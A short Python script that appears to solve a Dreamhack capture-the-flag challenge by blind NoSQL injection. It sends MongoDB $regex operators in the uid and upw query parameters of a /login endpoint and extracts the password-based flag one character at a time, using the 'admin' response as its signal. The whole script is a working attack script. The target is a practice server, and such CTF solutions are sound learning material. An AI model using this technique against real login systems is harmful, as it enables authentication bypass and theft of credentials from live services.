import string
import requests

dream_url = 'http://host3.dreamhack.games:13101'
mango = string.digits + string.ascii_letters
success = 'admin'  # 로그인에 성공한 경우 응답 메시지

flag = ''
while True:
    found_flag = False
    for ch in mango:
        response = requests.get(f'{dream_url}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        if response.text == success:
            flag += ch
            found_flag = True
            break
    if not found_flag:
        break

    print(f'FLAG: DH{{{flag}}}')